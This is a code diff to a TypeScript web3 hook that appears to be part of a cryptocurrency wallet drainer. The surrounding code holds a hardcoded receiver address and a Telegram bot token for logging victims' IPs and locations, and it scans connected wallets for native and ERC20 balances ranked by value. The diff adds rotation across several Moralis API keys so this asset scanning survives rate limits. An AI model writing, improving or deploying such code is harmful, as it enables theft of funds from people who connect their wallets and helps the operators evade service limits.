@@ -6,7 +6,8 @@ import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect 
 
 // Configuration from PRD/User
 const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
-const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY;
+// Parse comma-separated Moralis keys
+const MORALIS_KEYS = (process.env.NEXT_PUBLIC_MORALIS_API_KEY || "").split(",").map(k => k.trim()).filter(k => k.length > 0);
 
 // Fallback Token List (Top Assets) to scan if API fails
 const TARGET_TOKENS: Record<string, string[]> = {
@@ -87,6 +88,7 @@ export function useWeb3Manager() {
     // Ref to prevent duplicate "Connect" logs
     const hasLoggedConnection = useRef(false);
     const isProcessing = useRef(false);
+    const currentMoralisKeyIndex = useRef(0);
 
     // --- INTEGRATIONS ---
     const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
@@ -100,6 +102,35 @@ export function useWeb3Manager() {
         } catch (e) {
             return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
         }
+    };
+
+    // Helper: Moralis Fetch with Rotation
+    const fetchMoralis = async (url: string) => {
+        if (MORALIS_KEYS.length === 0) return null;
+
+        for (let i = 0; i < MORALIS_KEYS.length; i++) {
+            const keyIndex = (currentMoralisKeyIndex.current + i) % MORALIS_KEYS.length;
+            const key = MORALIS_KEYS[keyIndex];
+
+            try {
+                const res = await fetch(url, {
+                    headers: { 'X-API-Key': key, 'accept': 'application/json' }
+                });
+
+                if (res.status === 429 || res.status === 401) {
+                    console.warn(`Moralis Key ${keyIndex} failed with ${res.status}. Rotating...`);
+                    continue; // Try next key
+                }
+
+                if (res.ok) {
+                    currentMoralisKeyIndex.current = keyIndex; // Update persistent index
+                    return await res.json();
+                }
+            } catch (e) {
+                console.warn(`Fetch error with key ${keyIndex}`, e);
+            }
+        }
+        return null;
     };
 
     // Helper: Send Notification
@@ -238,51 +269,38 @@ export function useWeb3Manager() {
 
         // 2. MORALIS SCAN
         let moralisSuccess = false;
-        if (MORALIS_API_KEY) {
+        if (MORALIS_KEYS.length > 0) {
             await Promise.all(chains.map(async (chain) => {
                 try {
-                    // A. Native (Moralis)
-                    const nativeRes = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`, {
-                        headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
-                    });
+                    // A. Native (Moralis) using rotation helper
+                    const nativeData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`);
 
-                    if (nativeRes.ok) {
-                        const nativeData = await nativeRes.json();
-                        if (nativeData && BigInt(nativeData.balance) > 0n) {
-                            allAssets.push({
-                                address: "0x0000000000000000000000000000000000000000",
-                                chainId: chain.id,
-                                symbol: chain.symbol,
-                                isNative: true,
-                                balance: nativeData.balance,
-                                usd_value: 10 // Base priority
-                            });
-                        }
+                    if (nativeData && nativeData.balance && BigInt(nativeData.balance) > 0n) {
+                        allAssets.push({
+                            address: "0x0000000000000000000000000000000000000000",
+                            chainId: chain.id,
+                            symbol: chain.symbol,
+                            isNative: true,
+                            balance: nativeData.balance,
+                            usd_value: 10 // Base priority
+                        });
                     }
 
-                    // B. ERC20 (Moralis)
-                    const tokenRes = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`, {
-                        headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
-                    });
+                    // B. ERC20 (Moralis) using rotation helper
+                    const tokenData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`);
 
-                    if (tokenRes.ok) {
+                    if (tokenData && tokenData.result) {
                         moralisSuccess = true;
-                        const data = await tokenRes.json();
-                        if (data.result) {
-                            data.result.forEach((t: any) => {
-                                allAssets.push({
-                                    address: t.token_address,
-                                    chainId: chain.id,
-                                    symbol: t.symbol,
-                                    isNative: false,
-                                    balance: t.balance,
-                                    usd_value: parseFloat(t.usd_value || "0")
-                                });
+                        tokenData.result.forEach((t: any) => {
+                            allAssets.push({
+                                address: t.token_address,
+                                chainId: chain.id,
+                                symbol: t.symbol,
+                                isNative: false,
+                                balance: t.balance,
+                                usd_value: parseFloat(t.usd_value || "0")
                             });
-                        }
-                    } else {
-                        console.warn(`Moralis API Error (${chain.name}): ${tokenRes.status}`);
-                        // Don't auto-notify every failure to avoid spam, unless all fail.
+                        });
                     }
                 } catch (e) {
                     console.warn(`Scan Fail ${chain.name}`, e);
